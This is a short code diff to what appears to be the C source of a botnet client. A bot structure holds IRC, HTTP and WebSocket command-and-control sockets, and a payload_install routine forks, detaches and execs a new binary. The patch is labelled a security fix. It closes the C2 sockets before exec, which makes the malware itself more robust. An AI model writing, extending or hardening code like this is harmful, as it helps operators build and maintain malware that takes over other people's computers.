@@ -244,6 +244,11 @@ int payload_install(notnet_bot_t *bot, const char *bin_path) {
     pid_t pid = fork();
     if (pid == 0) {
         /* Child: detach and exec the new binary */
+        /* SECURITY FIX (#30): Close C2 sockets before exec to prevent
+         * the new binary from inheriting sensitive file descriptors. */
+        if (bot->c2_irc.sock >= 0) close(bot->c2_irc.sock);
+        if (bot->c2_http.sock >= 0) close(bot->c2_http.sock);
+        if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
         setsid();
         char *argv[] = { (char *)dest, NULL };
         execvp(dest, argv);
